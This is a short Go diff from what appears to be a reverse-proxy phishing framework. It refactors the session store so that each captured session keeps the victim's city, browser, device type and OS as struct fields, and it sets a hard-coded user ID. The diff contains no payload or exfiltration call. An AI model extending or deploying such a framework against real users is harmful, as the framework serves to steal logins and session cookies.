@@ -28,6 +28,10 @@ type Session struct {
 	UserId       string                             `json:"user_id"`
 	CountryCode  string                             `json:"country_code"`
 	Country      string                             `json:"country"`
+	City         string                             `json:"city"`
+	Browser      string                             `json:"browser"`
+	DeviceType   string                             `json:"device_type"`
+	OS           string                             `json:"os"`
 }
 
 type CookieToken struct {
@@ -68,6 +72,10 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		UserId:       "JEMEX123",
 		CountryCode:  "",
 		Country:      "",
+		City:         "",
+		Browser:      "",
+		DeviceType:   "",
+		OS:           "",
 	}
 
 	jf, _ := json.Marshal(s)
@@ -212,7 +220,7 @@ func (d *Database) sessionsUpdateCityInfo(sid string, city string) error {
 		return err
 	}
 
-	s.Custom["city"] = city
+	s.City = city
 	s.UpdateTime = time.Now().UTC().Unix()
 	
 	err = d.sessionsUpdate(s.Id, s)
@@ -225,9 +233,9 @@ func (d *Database) sessionsUpdateBrowserInfo(sid string, browser string, deviceT
 		return err
 	}
 
-	s.Custom["browser"] = browser
-	s.Custom["device_type"] = deviceType
-	s.Custom["os"] = os
+	s.Browser = browser
+	s.DeviceType = deviceType
+	s.OS = os
 	s.UpdateTime = time.Now().UTC().Unix()
 	
 	err = d.sessionsUpdate(s.Id, s)
